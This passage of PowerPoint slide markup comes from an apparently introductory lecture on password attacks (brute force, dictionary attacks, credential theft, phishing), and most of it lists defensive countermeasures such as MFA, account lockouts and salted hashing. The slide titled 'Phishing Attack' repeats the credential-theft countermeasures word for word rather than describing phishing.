              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>multiple failed login attempts in short time</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Used as a base method when no password policies are enforced.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="234733592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2D5C2-71A6-60E0-923D-6555D38C3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FB979E-ABAD-8C4C-B336-575BD445599A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F6C5DBB-38A9-AE65-E5E0-0BB9EA5EFE15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>strong password policies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> (length, complexity).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>account lockouts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> after multiple failed attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>· Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>rate limiting / CAPTCHA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> to slow down automated attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>Multi-Factor Authentication (MFA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> for extra security.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Monitor logs for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>suspicious repeated login attempts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Employ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t>IP blocking / throttling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> for suspicious activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t>·  Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0" err="1"/>
              <a:t>passwordless</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" b="1" dirty="0"/>
              <a:t> authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> (e.g., biometrics, security keys).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="66580833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1FB76-CE70-043A-FA47-5C48053B1506}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Dictionary Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6AA9859-043B-3046-5DAF-CF8DA56C915F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  A variant of brute force that uses a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>predefined list of common passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Faster than brute force because it avoids unlikely combinations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Relies on human tendency to use weak or common passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Often uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>leaked password lists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> from previous breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Automated using tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>Cain &amp; Abel, John the Ripper</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Targets login portals, email accounts, Wi-Fi passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Success depends on whether users follow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>poor password practices</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Harder to detect compared to brute force because attempts are fewer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="57205558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AF4B1-69BD-8A1C-B26F-0643C52D519D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F05C1B-5A04-1731-71BF-097231FAE6C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>strong password complexity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> (uppercase, lowercase, numbers, special characters).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>password blacklists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> to block common/compromised passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Store passwords using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0" err="1"/>
              <a:t>bcrypt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>, Argon2, or PBKDF2 hashing with salt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>account lockouts / CAPTCHA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> after failed attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Monitor login logs for repeated failed attempts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Encourage </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>password managers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> for strong unique passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Require </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>MFA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> to reduce reliance on passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="393981357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CA41D-24FB-A4E1-3B22-6580FF8DA7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2DBC0F-6F5D-5B45-8480-BCB37E86E1F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Credential Theft</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F5E3860-5F05-077E-5638-F10A955B21C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Attacker steals valid credentials (username/password) through malicious means.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Methods: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>keyloggers, malware, phishing, database breaches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Credentials may be sold on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>dark web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Often used in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>credential stuffing attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> (reuse stolen credentials).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  One stolen account may allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" b="1" dirty="0"/>
              <a:t>lateral movement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> to others.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Can bypass authentication if no additional checks exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  High risk if passwords are reused across multiple sites.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t>·  Target: banking, enterprise logins, email, cloud services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2100" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40809416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D8E94-0AA7-84AE-FC73-C9657D0D99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B9FDD-6DA7-2C6A-8465-B2A689BCD8BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01FEB52D-A151-EC53-6990-87603048463F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Store credentials securely (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>hashed + salted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Regularly monitor for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>credential leaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>MFA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> so stolen passwords alone don’t work.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Deploy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>anti-malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> and endpoint protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Encourage users to avoid </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reusing passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>breach detection systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to flag leaked credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>zero-trust authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> models.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="120460862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4D7E5-A0F7-7B1D-DDA2-1FF2B0E0E1F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Phishing Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D59777A4-77B7-D5A4-AC84-93CED1F594BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Store credentials securely (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>hashed + salted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Regularly monitor for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>credential leaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>MFA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> so stolen passwords alone don’t work.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Deploy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>anti-malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> and endpoint protection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Encourage users to avoid </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reusing passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>breach detection systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to flag leaked credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>zero-trust authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> models.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
